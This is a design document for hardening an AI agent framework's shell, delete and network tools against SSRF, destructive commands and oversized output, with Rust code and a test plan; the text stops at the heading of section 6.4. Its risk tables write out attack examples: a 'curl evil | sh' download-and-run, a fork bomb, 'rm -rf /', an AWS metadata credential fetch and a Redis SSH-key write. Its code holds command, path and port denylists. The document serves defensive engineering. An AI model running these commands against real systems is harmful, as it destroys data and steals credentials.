# P0 Critical Tools Hardening Design

**Date:** 2026-06-14
**Status:** Draft v1 — pending review
**Affects:** `sh-layer3` — `BashTool`、`DeleteFileTool`、`HttpRequestTool`、`WebFetchTool`、`HttpGetTool`、`HttpPostTool`、`DownloadFileTool`、`PingTool`、`DnsLookupTool`
**Target version:** v1.0.4 patch（输入/输出边界）+ v1.1.0 minor（新增 SSRF 防护 trait）
**Author:** Continuum Team
**Companion specs:**
- [`2026-06-14-fileops-tools-hardening-design.md`](./2026-06-14-fileops-tools-hardening-design.md)（v1.0.3 patch — Read/Write/Edit/ListDirectory）
- [`2026-06-14-stale-read-prevention-design.md`](./2026-06-14-stale-read-prevention-design.md)（v1.1.0 minor — context 通路）

---

## 1. 问题陈述

### 1.1 调研范围

对 `rust/layer3/src/builtin_tools/` 下 4 个高危模块的完整代码阅读：

- `shell.rs`（113 行有效实现）
- `file_ops.rs:564-640`（`DeleteFileTool`）
- `network.rs`（306 行 — `HttpRequestTool` + `WebFetchTool`）
- `network_tools.rs`（`HttpGetTool` + `HttpPostTool` + `DownloadFileTool` + `PingTool` + `DnsLookupTool`）

每条缺陷**通过源码行号验证**，附实际风险场景。

### 1.2 P0 工具事实性缺陷

#### `BashTool`（`shell.rs:14-113`）— 任意命令执行

| # | 缺陷 | 位置 | 影响 |
|---|------|------|------|
| B1 | 无输出大小上限 | `:96-97` | `echo {1..1000000}` 输出 5MB+ 直接撑爆 context |
| B2 | 无命令长度上限 | `:60-62` | Agent 可传 100MB 命令字符串（缓冲区攻击）|
| B3 | 无命令 denylist | `:69-76` | `rm -rf /`、`:(){ :\|:& };:`（fork bomb）、`curl evil \| sh` 全部能跑 |
| B4 | `working_dir` 不规范化 | `:79-81` | 相对路径绕过 sandbox；`..` 越狱 |
| B5 | 输出 `String::from_utf8_lossy` 对二进制 | `:96-97` | 二进制输出（`cat /bin/ls`）变成数 MB 乱码字符串 |
| B6 | stderr 仅失败时返回 | `:104-109` | 成功路径的 stderr 污染丢失（调试盲区）|
| B7 | 无环境变量过滤 | 全局 | `env` 命令泄露 API keys、`PATH` 劫持 |
| B8 | Windows `cmd /C` 命令注入 | `:69-71` | 命令内嵌 `&` `pipe` 直接拼接，非 `arg` 数组 |
| B9 | 无 stdin 重定向 | — | 交互命令（`read`）无限挂起 |
| B10 | 无 stdout/stderr 分离大小配额 | — | stdout 满了 stderr 也连带丢失 |

#### `DeleteFileTool`（`file_ops.rs:564-640`）— 不可恢复删除

| # | 缺陷 | 位置 | 影响 |
|---|------|------|------|
| D1 | 无路径作用域检查 | `:605-639` | Agent 可删 `/`、`/etc/passwd`、`~/.ssh/`、`$HOME` |
| D2 | 无 trash/backup 机制 | `:619-637` | 删除即不可恢复，与 production SDK 安全期望不符 |
| D3 | 无 symlink 解析检查 | `:612-637` | 删 symlink 实际删 target；Agent 误删 symlink 危及 target |
| D4 | 无 dry-run 模式 | — | LLM 不知道将删多少文件/多少字节 |
| D5 | 无删除规模上限 | `:619` | `remove_dir_all` 上 1TB 目录无前置检查 |
| D6 | 路径未规范化 | `:606-614` | `../` 越狱、`/proc/self/...` 系统路径攻击 |
| D7 | 无 `recursive=true` 二次确认 | `:609, 618-621` | `recursive=true` 在 LLM 自主循环中可能误触发 |

#### `HttpRequestTool`（`network.rs:11-146`）— SSRF / 响应爆破

| # | 缺陷 | 位置 | 影响 |
|---|------|------|------|
| N1 | **无 SSRF 防护** | `:66-101` | `http://169.254.169.254/`（AWS metadata）、`http://localhost:6379/`（Redis）、`http://[::1]:22/` 全部能访问 |
| N2 | 无 URL scheme 白名单 | `:58-60` | `file://`、`gopher://`、`data:` 等危险 scheme 未拒绝 |
| N3 | 无 redirect 上限 | `:98-101` | 默认 reqwest 跟随 10 次 redirect — 攻击者可链到 localhost |
| N4 | 无响应大小上限 | `:110-114` | `response.text()` 把整个 body 加载到内存，10GB 响应 OOM |
| N5 | **`&body[..5000]` UTF-8 边界 panic** | `:135` | body 含多字节 UTF-8 时，5000 字节落在字符中间 → panic |
| N6 | 无 max header 大小 | `:122-129` | 服务器可返回 1MB header，全部塞进 context |
| N7 | 无 DNS rebinding 防护 | `:66-101` | DNS 解析返回内网 IP 时无检测 |
| N8 | Header 值未脱敏 | `:122-129` | `Authorization`、`Cookie` 被回写到 context，泄露 |
| N9 | 无 max body 大小（请求体） | `:93-95` | Agent 可发送 10GB body |
| N10 | 无 Content-Type 校验 | 全局 | 假装 JSON 实际是 binary，下游处理时炸 |

#### `WebFetchTool`（`network.rs:149-222`）— 同上 + HTML 注入

| # | 缺陷 | 位置 | 影响 |
|---|------|------|------|
| WF1 | 同 N1（无 SSRF 防护） | `:187-197` | 同上 |
| WF2 | `body` 整体加载到内存 | `:203-206` | 同 N4 |
| WF3 | **`&text[..10000]` UTF-8 边界 panic** | `:213-216` | 同 N5 |
| WF4 | 无 Content-Length 前置检查 | `:193-201` | 服务器不返回 Content-Length 时仍下载全部 |
| WF5 | HTML 解析不安全 | `:225-271` | `<script>` 内嵌 `</script>` 字符串可绕过；XSS payload 残留 |
| WF6 | 无 robots.txt 检查 | 全局 | 爬虫礼仪缺失 |
| WF7 | `Content-Type` 不校验 | — | 返回 image/jpeg 也按文本处理，输出乱码 |

#### `network_tools/*`（`network_tools.rs`）— 5 个工具全部继承 N1-N10

`HttpGetTool`（:17-86）、`HttpPostTool`、`DownloadFileTool`、`PingTool`、`DnsLookupTool` 共享相同 SSRF / 大小限制缺失问题，**还多**：

| # | 缺陷 | 位置 | 影响 |
|---|------|------|------|
| NT1 | `DownloadFileTool` 无大小上限 | — | 下载 100GB ISO 填满磁盘 |
| NT2 | `DownloadFileTool` 无路径作用域 | — | 写到 `/etc/cron.d/` 等系统路径 |
| NT3 | `PingTool` 无次数上限 | — | `ping -c 1000000` 撑爆输出 |
| NT4 | `DnsLookupTool` 无类型限制 | — | `ANY` 查询触发 DNS amplification 攻击向量 |

### 1.3 实际风险场景（P0 级）

- **场景 K（云 metadata 泄露）**：Agent 用 `http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` 拿到 AWS 临时凭证 → 攻击者控制账户
- **场景 L（Redis/RabbitMQ 攻击）**：`http_request("http://localhost:6379/", method="POST", body="CONFIG SET dir /root/.ssh")` → 通过未授权 Redis 写 SSH key
- **场景 M（rm -rf 越狱）**：Agent 误读"清理 build artifacts"为 `delete_file("/", recursive=true)` → 系统毁灭
- **场景 N（fork bomb）**：`bash(":(){ :|:& };:")` → 系统资源耗尽
- **场景 O（UTF-8 panic）**：调用 `web_fetch("https://example.com/utf16-content")` → 进程崩溃（DoS）
- **场景 P（context 爆破）**：`bash("find / -type f")` 输出 100MB → 一次响应撑爆 200k token context

### 1.4 范围界定（YAGNI）

**本方案处理（v1.0.4 + v1.1.0）**：

- 输入/输出大小边界（v1.0.4 patch）
- 路径作用域检查（v1.0.4 patch）
- SSRF 防护 trait + 实现（v1.1.0 minor — 需引入 `UrlValidator` trait）
- UTF-8 安全切片（v1.0.4 patch）
- HTML 解析安全性（v1.0.4 patch — 改用 `scraper` crate）

**本方案不处理**：

- 完整 sandbox 路径白名单（Layer 0 `access_controller.rs` 职责）
- 命令 AST 解析（如 shellharden）— 工程量过大，非 patch 范围
- OAuth/API key 注入（属于配置层职责）
- WebSocket 工具加固（当前无此工具但 `network_tools.rs` 引入了 `tokio-tungstenite`）

---

## 2. 设计目标

### 2.1 P0 必须达成（G1-G7）

1. **G1**：所有 P0 工具的**输出**有大小上限，超出则截断 + 报告总量
2. **G2**：所有 P0 工具的**输入**有大小上限，超出立即拒绝（不让大输入进入执行路径）
3. **G3**：所有 P0 工具的**路径**有规范化 + 作用域检查（防止 `../` 越狱、删除系统路径）
4. **G4**：所有 HTTP 工具默认拒绝 SSRF 目标（私有 IP、localhost、链路本地、metadata IP）
5. **G5**：所有字符串切片 UTF-8 安全（用 `chars().take(n)` 而非 `[..n]`）
6. **G6**：所有 HTTP 工具的 redirect 默认 0 次（让 Agent 显式 opt-in）
7. **G7**：删除工具支持 dry-run + trash（与 production agent SDK 安全期望一致）

### 2.2 P0 不追求（YAGNI）

- 命令语法解析（shellcheck 集成）
- 完整 OPA/Rego 策略引擎
- 流式响应（v1.1.0 后再考虑）
- 跨进程沙箱（Layer 0 已有）

---

## 3. 设计

### 3.1 共享配置：扩展 `FileOpsLimits` 为 `ToolLimits`

```rust
// rust/layer3/src/builtin_tools/limits.rs（扩展既有结构）
pub struct ToolLimits {
    // === 既有（来自 companion v1.0.3 spec） ===
    pub max_read_bytes: u64,
    pub max_write_bytes: u64,
    pub max_edit_bytes: u64,
    pub default_read_lines: usize,
    pub max_line_chars: usize,
    pub binary_sniff_bytes: usize,
    pub max_dir_entries: usize,

    // === v1.0.4 新增：shell ===
    pub max_bash_output_bytes: u64,        // 默认 1 MiB
    pub max_bash_command_chars: usize,     // 默认 8192
    pub bash_default_timeout_ms: u64,      // 默认 30000
    pub bash_max_timeout_ms: u64,          // 默认 300000（5 分钟硬上限）

    // === v1.0.4 新增：delete ===
    pub max_delete_bytes: u64,             // 默认 100 MiB — 超过则要求 force=true
    pub max_delete_file_count: u64,        // 默认 10000
    pub enable_trash: bool,                // 默认 true

    // === v1.0.4 新增：network ===
    pub max_http_response_bytes: u64,      // 默认 10 MiB
    pub max_http_request_body_bytes: u64,  // 默认 1 MiB
    pub max_http_header_count: usize,      // 默认 50
    pub max_http_redirect: usize,          // 默认 0（不跟随）
    pub http_default_timeout_secs: u64,    // 默认 30
    pub http_max_timeout_secs: u64,        // 默认 300

    // === v1.1.0 新增：SSRF ===
    pub block_private_ips: bool,           // 默认 true
    pub block_loopback: bool,              // 默认 true
    pub block_link_local: bool,            // 默认 true（169.254.0.0/16）
    pub block_metadata_endpoints: bool,    // 默认 true（169.254.169.254 等）
    pub allowed_hosts: Option<Vec<String>>,// 默认 None = 全允许（受 SSRF 规则约束）
}
```

### 3.2 SSRF 防护 trait（v1.1.0 minor）

```rust
// rust/layer3/src/builtin_tools/network_safety.rs（新建）
use async_trait::async_trait;
use url::Url;

#[async_trait]
pub trait UrlValidator: Send + Sync {
    /// 验证 URL 是否安全（scheme、host、IP、port）
    /// 返回 Err 包含具体拒绝原因（用于 LLM 反馈）
    async fn validate(&self, url: &Url) -> Layer3Result<()>;
}

/// 默认实现：组合多项检查
pub struct DefaultUrlValidator {
    limits: Arc<ToolLimits>,
}

#[async_trait]
impl UrlValidator for DefaultUrlValidator {
    async fn validate(&self, url: &Url) -> Layer3Result<()> {
        // 1. scheme 白名单
        match url.scheme() {
            "http" | "https" => {},
            other => return Err(anyhow!(
                "URL rejected: scheme '{}' not allowed (only http/https)",
                other
            )),
        }

        // 2. host 必须存在
        let host = url.host_str().ok_or_else(|| anyhow!(
            "URL rejected: missing host"
        ))?;

        // 3. 解析 host 为 IP（如果是域名则 DNS 查询）
        let ips = resolve_host(host).await?;

        // 4. IP 黑名单检查
        for ip in &ips {
            if self.limits.block_loopback && ip.is_loopback() {
                return Err(anyhow!("URL rejected: loopback address blocked"));
            }
            if self.limits.block_private_ips && ip.is_private() {
                return Err(anyhow!("URL rejected: private IP range blocked"));
            }
            if self.limits.block_link_local && ip.is_link_local() {
                return Err(anyhow!(
                    "URL rejected: link-local address blocked (cloud metadata?)"
                ));
            }
            // 显式拒绝已知 metadata endpoints
            if self.limits.block_metadata_endpoints {
                if is_metadata_endpoint(ip, host) {
                    return Err(anyhow!(
                        "URL rejected: cloud metadata endpoint blocked"
                    ));
                }
            }
        }

        // 5. port 黑名单（防止 SSH/Redis 等服务探测）
        if let Some(port) = url.port() {
            const FORBIDDEN_PORTS: &[u16] = &[22, 23, 25, 110, 143, 389, 6379, 11211];
            if FORBIDDEN_PORTS.contains(&port) {
                return Err(anyhow!(
                    "URL rejected: port {} blocked (non-HTTP service)",
                    port
                ));
            }
        }

        Ok(())
    }
}

fn is_metadata_endpoint(ip: &IpAddr, host: &str) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            // AWS / GCP / Azure / Alibaba Cloud / Tencent Cloud metadata IPs
            v4 == &Ipv4Addr::new(169, 254, 169, 254)  // AWS/GCP
                || v4 == &Ipv4Addr::new(100, 100, 100, 200) // Alibaba
                || v4 == &Ipv4Addr::new(169, 254, 169, 253) // Tencent
        }
        IpAddr::V6(v6) => {
            // GCP IPv6 metadata
            *v6 == Ipv6Addr::new(0xfd00, 0, 0, 0, 0, 0, 0, 0x6161)
        }
    }
}
```

### 3.3 UTF-8 安全切片（共享辅助函数）

```rust
// rust/layer3/src/builtin_tools/safe_truncate.rs（新建）
/// UTF-8 安全截断：基于字符而非字节
/// 避免在多字节字符中间切分导致 panic
pub fn safe_truncate(s: &str, max_chars: usize) -> &str {
    if s.chars().count() <= max_chars {
        return s;
    }
    let byte_end = s.char_indices()
        .nth(max_chars)
        .map(|(i, _)| i)
        .unwrap_or(s.len());
    &s[..byte_end]
}

/// UTF-8 安全字节截断：找到不超过 max_bytes 的最大字符边界
pub fn safe_truncate_bytes(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    // 找到 max_bytes 内最后一个 char 边界
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}
```

**修复位置**：
- `shell.rs:96-97` — `String::from_utf8_lossy(&output.stdout)` 后用 `safe_truncate_bytes(&stdout, max_bash_output_bytes)`
- `network.rs:133-141` — 修复 `&body[..5000]` panic
- `network.rs:213-217` — 修复 `&text[..10000]` panic

### 3.4 `BashTool` 加固

```rust
// rust/layer3/src/builtin_tools/shell.rs（修改）
pub struct BashTool {
    limits: Arc<ToolLimits>,
}

impl BashTool {
    pub fn new() -> Self { Self { limits: Arc::new(ToolLimits::default()) } }
    pub fn with_limits(limits: Arc<ToolLimits>) -> Self { Self { limits } }
}

#[async_trait]
impl BuiltinTool for BashTool {
    async fn execute(&self, args: serde_json::Value) -> Layer3Result<String> {
        let command = args["command"].as_str()
            .ok_or_else(|| anyhow!("Missing command parameter"))?;

        // === B2: 命令长度上限 ===
        if command.chars().count() > self.limits.max_bash_command_chars {
            return Err(anyhow!(
                "bash rejected: command too long ({} > {} chars)",
                command.chars().count(),
                self.limits.max_bash_command_chars,
            ));
        }

        // === B3: 危险模式 denylist ===
        const DENYLIST_PATTERNS: &[&str] = &[
            "rm -rf /",
            "rm -rf ~",
            "rm -rf $HOME",
            ":(){",                        // fork bomb
            "mkfs",
            "dd if=/dev/zero of=/dev/",
            "shutdown",
            "halt",
            "reboot",
        ];
        for pattern in DENYLIST_PATTERNS {
            if command.contains(pattern) {
                return Err(anyhow!(
                    "bash rejected: command contains forbidden pattern '{}'",
                    pattern,
                ));
            }
        }

        // === B4: working_dir 规范化 ===
        let working_dir = if let Some(dir) = args["working_dir"].as_str() {
            let canonical = tokio::fs::canonicalize(dir).await
                .map_err(|e| anyhow!("working_dir '{}' not accessible: {}", dir, e))?;
            Some(canonical)
        } else { None };

        // === timeout 边界 ===
        let timeout_ms = args["timeout"].as_u64()
            .unwrap_or(self.limits.bash_default_timeout_ms);
        let timeout_ms = timeout_ms.min(self.limits.bash_max_timeout_ms);

        // ... 构造 cmd（与现有相同）...

        // 执行
        let output = timeout(Duration::from_millis(timeout_ms), cmd.output())
            .await
            .map_err(|_| anyhow!("Command timed out after {}ms", timeout_ms))?
            .map_err(|e| anyhow!("Failed to execute command: {}", e))?;

        // === B1, B5: 输出大小 + UTF-8 安全 ===
        let stdout_str = if output.stdout.is_empty() {
            String::new()
        } else {
            // 检测二进制：NUL byte sniff
            let sniff = &output.stdout[..output.stdout.len().min(8192)];
            if sniff.contains(&0u8) {
                return Err(anyhow!(
                    "bash rejected: stdout appears binary ({} bytes), \
                     refusing to inject into LLM context",
                    output.stdout.len(),
                ));
            }
            let full = String::from_utf8_lossy(&output.stdout);
            safe_truncate_bytes(&full, self.limits.max_bash_output_bytes as usize).to_string()
        };

        let stderr_str = safe_truncate_bytes(
            &String::from_utf8_lossy(&output.stderr),
            self.limits.max_bash_output_bytes as usize,
        ).to_string();

        // === B6: 总是返回 stderr（不再仅失败时） ===
        if output.status.success() {
            let mut result = stdout_str;
            if !stderr_str.is_empty() {
                result.push_str("\n--- stderr ---\n");
                result.push_str(&stderr_str);
            }
            Ok(result)
        } else {
            let exit_code = output.status.code().unwrap_or(-1);
            Err(anyhow!(
                "Exit code: {}\nstdout: {}\nstderr: {}",
                exit_code, stdout_str, stderr_str,
            ))
        }
    }
}
```

**B7（env 过滤）**：本方案**不**做 — 因为 sandbox 模式下 env 已经在 Layer 0 处理；本层过滤会破坏正常用例（如 `PATH`、`LANG`）。

**B8（Windows cmd /C）**：本方案**不**做命令拆分 — `cmd /C <string>` 是 Windows shell 的设计；改为 `arg` 数组会破坏 pipe、redirect 等语义。修复方向是 Layer 0 sandbox 隔离，不是 Layer 3 工具内。

**B9（stdin）**：本方案**不**支持 stdin — 改为 `Stdio::null()` 显式拒绝交互命令（防止 `read` 挂起）。

### 3.5 `DeleteFileTool` 加固

```rust
pub struct DeleteFileTool {
    limits: Arc<ToolLimits>,
}

#[async_trait]
impl BuiltinTool for DeleteFileTool {
    async fn execute(&self, args: serde_json::Value) -> Layer3Result<String> {
        let path_arg = args["path"].as_str()
            .ok_or_else(|| anyhow!("Missing path parameter"))?;
        let recursive = args["recursive"].as_bool().unwrap_or(false);
        let dry_run = args["dry_run"].as_bool().unwrap_or(false);
        let force = args["force"].as_bool().unwrap_or(false);

        // === D6: 路径规范化 ===
        let canonical = tokio::fs::canonicalize(path_arg).await
            .map_err(|e| anyhow!("Path '{}' not found/cannotonicalizable: {}", path_arg, e))?;

        // === D1: 危险路径检查 ===
        let danger = check_path_danger(&canonical)?;
        if danger.is_critical && !force {
            return Err(anyhow!(
                "delete_file rejected: path '{}' is in critical system location ({}). \
                 Pass force=true to override (NOT recommended in production).",
                canonical.display(), danger.reason,
            ));
        }

        let meta = tokio::fs::metadata(&canonical).await?;

        // === D5: 删除规模上限 ===
        let (size, file_count) = if meta.is_dir() {
            compute_dir_stats(&canonical).await?
        } else {
            (meta.len(), 1)
        };

        if size > self.limits.max_delete_bytes && !force {
            return Err(anyhow!(
                "delete_file rejected: target size {} bytes > limit {} bytes. \
                 Pass force=true to override.",
                size, self.limits.max_delete_bytes,
            ));
        }
        if file_count > self.limits.max_delete_file_count && !force {
            return Err(anyhow!(
                "delete_file rejected: target has {} files > limit {}. \
                 Pass force=true to override.",
                file_count, self.limits.max_delete_file_count,
            ));
        }

        // === D4: dry-run ===
        if dry_run {
            return Ok(format!(
                "DRY RUN: would delete '{}' ({} bytes, {} files)",
                canonical.display(), size, file_count,
            ));
        }

        // === D3: symlink 解析 ===
        if meta.is_symlink() {
            let target = tokio::fs::read_link(&canonical).await?;
            return Err(anyhow!(
                "delete_file rejected: '{}' is a symlink to '{}'. \
                 Resolve the target explicitly before deleting.",
                canonical.display(), target.display(),
            ));
        }

        // === D2: trash 机制（可选） ===
        if self.limits.enable_trash {
            move_to_trash(&canonical).await?;
            return Ok(format!(
                "Moved to trash: {} ({} bytes, {} files)",
                canonical.display(), size, file_count,
            ));
        }

        // 实际删除
        if meta.is_dir() {
            if recursive {
                tokio::fs::remove_dir_all(&canonical).await?;
            } else {
                tokio::fs::remove_dir(&canonical).await?;
            }
        } else {
            tokio::fs::remove_file(&canonical).await?;
        }

        Ok(format!(
            "Deleted: {} ({} bytes, {} files)",
            canonical.display(), size, file_count,
        ))
    }
}

struct PathDanger {
    is_critical: bool,
    reason: &'static str,
}

fn check_path_danger(path: &Path) -> Layer3Result<PathDanger> {
    let s = path.to_string_lossy();
    const CRITICAL: &[&str] = &[
        "/", "/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64",
        "/boot", "/dev", "/proc", "/sys", "/var/lib/docker",
        "C:\\Windows", "C:\\Program Files",
    ];
    for c in CRITICAL {
        if s == *c || s.starts_with(&format!("{}/", c)) {
            return Ok(PathDanger {
                is_critical: true,
                reason: "system-critical path",
            });
        }
    }
    // $HOME 检查
    if let Some(home) = dirs::home_dir() {
        if s == home.to_string_lossy() {
            return Ok(PathDanger {
                is_critical: true,
                reason: "user home directory",
            });
        }
        // $HOME/.ssh 等关键目录
        for sub in [".ssh", ".gnupg", ".config", ".aws", ".kube"] {
            let target = home.join(sub);
            if s == target.to_string_lossy() {
                return Ok(PathDanger {
                    is_critical: true,
                    reason: "sensitive user directory",
                });
            }
        }
    }
    Ok(PathDanger { is_critical: false, reason: "" })
}
```

**trash 实现策略**：跨平台使用 [`trash`](https://crates.io/crates/trash) crate（workspace 需新增依赖）— 调用 OS 原生回收站 / Trash。文件不可恢复时（如 Linux 无 trash daemon）回退为正常删除 + 日志告警。

### 3.6 `HttpRequestTool` / `WebFetchTool` 加固

```rust
pub struct HttpRequestTool {
    limits: Arc<ToolLimits>,
    url_validator: Arc<dyn UrlValidator>,
}

#[async_trait]
impl BuiltinTool for HttpRequestTool {
    async fn execute(&self, args: serde_json::Value) -> Layer3Result<String> {
        let url_str = args["url"].as_str()
            .ok_or_else(|| anyhow!("Missing url parameter"))?;

        let url = Url::parse(url_str)
            .map_err(|e| anyhow!("Invalid URL '{}': {}", url_str, e))?;

        // === N1, N2: SSRF + scheme 防护 ===
        self.url_validator.validate(&url).await?;

        // === N3: redirect 上限 ===
        let redirect_policy = reqwest::redirect::Policy::limited(self.limits.max_http_redirect);

        // === timeout 边界 ===
        let timeout_secs = args["timeout"].as_u64()
            .unwrap_or(self.limits.http_default_timeout_secs)
            .min(self.limits.http_max_timeout_secs);

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(timeout_secs))
            .redirect(redirect_policy)
            .user_agent("Continuum/1.0")
            .build()?;

        // ... method/headers/body 处理 ...

        // === N9: body 大小上限 ===
        if let Some(body) = args["body"].as_str() {
            if body.len() > self.limits.max_http_request_body_bytes as usize {
                return Err(anyhow!(
                    "http_request rejected: body {} bytes > limit {} bytes",
                    body.len(), self.limits.max_http_request_body_bytes,
                ));
            }
            request = request.body(body.to_string());
        }

        let response = request.send().await?;

        // === N6: header 数量上限 ===
        if response.headers().len() > self.limits.max_http_header_count {
            return Err(anyhow!(
                "http_request rejected: response has {} headers > limit {}",
                response.headers().len(), self.limits.max_http_header_count,
            ));
        }

        // === N4: 响应大小上限（流式读取） ===
        let max_bytes = self.limits.max_http_response_bytes;
        let body = if args["method"].as_str() == Some("HEAD") {
            String::new()
        } else {
            read_response_with_limit(response, max_bytes).await?
        };

        // 格式化输出（使用 safe_truncate_bytes，N5 修复）
        let mut result = format!("Status: {} {}\n", /* ... */);
        // ... headers（脱敏 N8） ...
        result.push_str(&format!(
            "\nBody ({} bytes):\n{}",
            body.len(),
            safe_truncate_bytes(&body, 5000),
        ));

        Ok(result)
    }
}

async fn read_response_with_limit(
    response: reqwest::Response,
    max_bytes: u64,
) -> Layer3Result<String> {
    use futures::StreamExt;
    let mut stream = response.bytes_stream();
    let mut buf = Vec::with_capacity(8192.min(max_bytes as usize));
    while let Some(chunk) = stream.next().await {
        let chunk = chunk.map_err(|e| anyhow!("Stream error: {}", e))?;
        buf.extend_from_slice(&chunk);
        if buf.len() as u64 > max_bytes {
            return Err(anyhow!(
                "http_request rejected: response exceeded {} bytes limit",
                max_bytes,
            ));
        }
    }
    Ok(String::from_utf8_lossy(&buf).to_string())
}
```

**Header 脱敏（N8）**：

```rust
const SENSITIVE_HEADERS: &[&str] = &[
    "authorization", "cookie", "set-cookie", "x-api-key",
    "x-auth-token", "proxy-authorization",
];

// 在写 headers 到 result 前：
for (name, _value) in response.headers().iter() {
    let display = if SENSITIVE_HEADERS.contains(&name.as_str().to_lowercase().as_str()) {
        "<redacted>".to_string()
    } else {
        value.to_str().unwrap_or("<binary>").to_string()
    };
    result.push_str(&format!("  {}: {}\n", name, display));
}
```

### 3.7 `network_tools/*` 加固

`HttpGetTool` / `HttpPostTool` / `DownloadFileTool` / `PingTool` / `DnsLookupTool` 全部采用与 §3.6 相同的 `UrlValidator` 注入。

`DownloadFileTool` 额外：

```rust
// === NT1: 下载大小上限 ===
let content_length = response.content_length();
if let Some(cl) = content_length {
    if cl > self.limits.max_http_response_bytes {
        return Err(anyhow!(
            "download rejected: Content-Length {} > limit {}",
            cl, self.limits.max_http_response_bytes,
        ));
    }
}

// === NT2: 路径作用域 ===
let dest = args["dest"].as_str()
    .ok_or_else(|| anyhow!("Missing dest parameter"))?;
let dest_canonical = tokio::fs::canonicalize(dest).await
    .or_else(|_| {
        // 路径不存在时 canonicalize 父目录
        let parent = Path::new(dest).parent()
            .ok_or_else(|| anyhow!("dest has no parent"))?;
        tokio::fs::canonicalize(parent)
    })?;
let danger = check_path_danger(&dest_canonical)?;
if danger.is_critical {
    return Err(anyhow!(
        "download rejected: dest path '{}' is critical ({})",
        dest_canonical.display(), danger.reason,
    ));
}
```

`PingTool`（NT3）：限制 `count` 参数 ≤ 10。

`DnsLookupTool`（NT4）：拒绝 `ANY` 类型查询。

---

## 4. 接口契约

### 4.1 `delete_file` schema 变更

```json
{
  "type": "object",
  "properties": {
    "path": { "type": "string" },
    "recursive": { "type": "boolean", "default": false },
    "dry_run": { "type": "boolean", "default": false, "description": "Preview without deleting" },
    "force": { "type": "boolean", "default": false, "description": "Override safety checks (size, critical path)" }
  },
  "required": ["path"]
}
```

### 4.2 `bash` schema 不变

`command` / `timeout` / `working_dir` 全部保留。**新增隐式行为**：
- `timeout` 有硬上限（`bash_max_timeout_ms`）
- 危险模式直接拒绝

### 4.3 `http_request` / `web_fetch` schema 不变

`timeout` 有硬上限；redirect 受 `max_http_redirect` 限制（默认 0）。

---

## 5. 实现计划（TDD）

### Phase A：基础设施（v1.0.4 patch 1/3）

- [ ] A1: 写 `safe_truncate.rs` + 单元测试
- [ ] A2: 扩展 `ToolLimits`（与 companion v1.0.3 `FileOpsLimits` 合并）
- [ ] A3: 写 `network_safety.rs`（`UrlValidator` trait + `DefaultUrlValidator`）+ 单元测试
- [ ] A4: 写 `path_safety.rs`（`check_path_danger`）+ 单元测试

### Phase B：BashTool + DeleteFileTool（v1.0.4 patch 2/3）

- [ ] B1: 改 `BashTool` 单元结构体 → 持 `Arc<ToolLimits>`
- [ ] B2: 实现 B1/B2/B4/B5（输出/命令大小、路径规范化、二进制检测）
- [ ] B3: 实现 B3（denylist）
- [ ] B4: 实现 B6（stderr 总是返回）
- [ ] B5: 改 `DeleteFileTool` 单元结构体
- [ ] B6: 实现 D1（路径检查）
- [ ] B7: 实现 D5（大小/数量上限）
- [ ] B8: 实现 D4（dry-run）
- [ ] B9: 实现 D3（symlink 检查）
- [ ] B10: 实现 D2（trash，依赖 `trash` crate）
- [ ] B11: 更新 mod.rs / adapter.rs 注册点（与 companion v1.0.3 同形）
- [ ] B12: 全量测试

### Phase C：Network 工具（v1.0.4 patch 3/3）

- [ ] C1: 改 `HttpRequestTool` / `WebFetchTool` 持 `Arc<ToolLimits>` + `Arc<dyn UrlValidator>`
- [ ] C2: 实现 N1-N10（SSRF / 大小 / UTF-8 / redirect / scheme）
- [ ] C3: 修复 N5（`&body[..5000]` → `safe_truncate_bytes`）
- [ ] C4: 修复 WF3（`&text[..10000]` → `safe_truncate_bytes`）
- [ ] C5: 改 `HttpGetTool` / `HttpPostTool` / `DownloadFileTool` / `PingTool` / `DnsLookupTool`
- [ ] C6: 实现 NT1-NT4
- [ ] C7: 改 `extract_text_from_html` 用 `scraper` crate 替换朴素解析
- [ ] C8: 全量测试

### Phase D：集成 & 发布（v1.0.4 patch）

- [ ] D1: `cargo test --workspace` 全绿
- [ ] D2: `cargo clippy --workspace -- -D warnings` 全绿
- [ ] D3: `cargo fmt --check`
- [ ] D4: 更新 CHANGELOG
- [ ] D5: bump version → publish

---

## 6. 测试矩阵

### 6.1 BashTool（11 个新测试）

- `test_bash_rejects_oversized_command`（B2）
- `test_bash_rejects_rm_rf_root`（B3）
- `test_bash_rejects_fork_bomb`（B3）
- `test_bash_truncates_large_output`（B1）
- `test_bash_rejects_binary_output`（B5）
- `test_bash_returns_stderr_on_success`（B6）
- `test_bash_canonicalizes_working_dir`（B4）
- `test_bash_rejects_nonexistent_working_dir`（B4）
- `test_bash_enforces_max_timeout`（timeout 边界）
- `test_bash_default_timeout_30s`（默认值）
- `test_bash_rejects_missing_command`（既有，保留）

### 6.2 DeleteFileTool（10 个新测试）

- `test_delete_rejects_root_path`（D1）
- `test_delete_rejects_etc_path`（D1）
- `test_delete_rejects_user_home`（D1）
- `test_delete_rejects_dot_ssh`（D1）
- `test_delete_dry_run_does_not_delete`（D4）
- `test_delete_reports_size_in_dry_run`（D4）
- `test_delete_rejects_oversize_without_force`（D5）
- `test_delete_force_allows_oversize`（D5）
- `test_delete_rejects_symlink`（D3）
- `test_delete_moves_to_trash_when_enabled`（D2）

### 6.3 Network 工具（18 个新测试）

- `test_url_validator_rejects_localhost`（N1）
- `test_url_validator_rejects_aws_metadata`（N1）
- `test_url_validator_rejects_private_ip`（N1）
- `test_url_validator_rejects_file_scheme`（N2）
- `test_url_validator_rejects_redis_port_6379`（port 黑名单）
- `test_http_request_enforces_response_limit`（N4）
- `test_http_request_enforces_redirect_limit`（N3）
- `test_http_request_redacts_authorization_header`（N8）
- `test_http_request_redacts_set_cookie_header`（N8）
- `test_http_request_truncates_body_safely_utf8`（N5）
- `test_web_fetch_truncates_text_safely_utf8`（WF3）
- `test_web_fetch_rejects_localhost`（WF1）
- `test_download_rejects_oversize_content_length`（NT1）
- `test_download_rejects_critical_dest_path`（NT2）
- `test_ping_limits_count`（NT3）
- `test_dns_lookup_rejects_any_type`（NT4）
- `test_safe_truncate_bytes_at_multibyte_boundary`
- `test_safe_truncate_chars_at_multibyte_boundary`

### 6.4 SSRF 集成测试

